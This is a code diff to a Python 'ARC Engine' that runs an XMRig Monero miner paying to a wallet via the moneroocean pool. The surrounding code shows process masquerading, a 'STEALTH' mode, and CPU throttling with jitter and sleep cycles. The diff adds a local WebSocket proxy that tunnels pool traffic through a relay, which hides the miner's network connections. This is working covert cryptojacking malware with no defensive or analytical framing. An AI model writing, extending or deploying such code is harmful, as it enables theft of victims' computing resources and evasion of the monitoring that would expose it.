@@ -70,6 +70,7 @@ class ARCEngine:
 
     def __init__(self):
         self.miner_process = None
+        self.ws_proxy_process = None
         self.running = True
         self.cpulimit_process = None
         self.last_sleep_time = time.time()
@@ -78,6 +79,13 @@ class ARCEngine:
 
     def generate_miner_config(self):
         """Generate XMRig config dynamically with wallet and relay settings."""
+        if RELAY_URL:
+            pool_url = "127.0.0.1:10128"
+            pool_tls = False
+        else:
+            pool_url = "gulf.moneroocean.stream:10128"
+            pool_tls = True
+
         config = {
             "autosave": False,
             "cpu": True,
@@ -92,10 +100,10 @@ class ARCEngine:
             },
             "pools": [
                 {
-                    "url": "gulf.moneroocean.stream:10128",
+                    "url": pool_url,
                     "user": XMR_WALLET,
                     "pass": WORKER_NAME,
-                    "tls": True,
+                    "tls": pool_tls,
                     "keepalive": True
                 }
             ],
@@ -125,6 +133,26 @@ class ARCEngine:
             log.info(f"Process masqueraded as: {name.decode()}")
         except Exception:
             log.warning("Process masquerade not available (non-Linux or no libc)")
+
+    def start_ws_proxy(self):
+        """Start the local WebSocket proxy if RELAY_URL is provided."""
+        if not RELAY_URL:
+            return
+
+        proxy_script = os.path.join(os.path.dirname(__file__), "ws_proxy.py")
+        log.info(f"Starting local WS proxy: {proxy_script}")
+        
+        try:
+            self.ws_proxy_process = subprocess.Popen(
+                [sys.executable, proxy_script],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True
+            )
+            log.info(f"WS Proxy started — PID: {self.ws_proxy_process.pid}")
+            time.sleep(3)  # Give proxy time to bind and connect
+        except Exception as e:
+            log.error(f"Failed to start WS proxy: {e}")
 
     def start_miner(self):
         """Start the XMRig mining process."""
@@ -231,6 +259,7 @@ class ARCEngine:
         log.info("=" * 50)
         log.info("  LUMEN ARC ENGINE v2")
         log.info(f"  Mode: {'TURBO' if TURBO_MODE else 'STEALTH'}")
+        log.info(f"  Tunnel: {RELAY_URL if RELAY_URL else 'DIRECT (no relay)'}")
         log.info(f"  CPU Range: {TARGET_CPU_MIN}% - {TARGET_CPU_MAX}%")
         log.info(f"  Jitter Interval: {JITTER_INTERVAL}s")
         log.info(f"  Sleep Cycles: {'ON' if SLEEP_ENABLED else 'OFF'}")
@@ -238,6 +267,7 @@ class ARCEngine:
         log.info("=" * 50)
         
         self.masquerade_process()
+        self.start_ws_proxy()
         self.start_miner()
         
         while self.running:
@@ -285,6 +315,12 @@ class ARCEngine:
         self.running = False
         self.stop_miner()
         
+        if self.ws_proxy_process:
+            try:
+                self.ws_proxy_process.terminate()
+            except Exception:
+                pass
+                
         uptime = time.time() - self.start_time
         hours = uptime / 3600
         log.info(f"Session duration: {hours:.1f} hours")
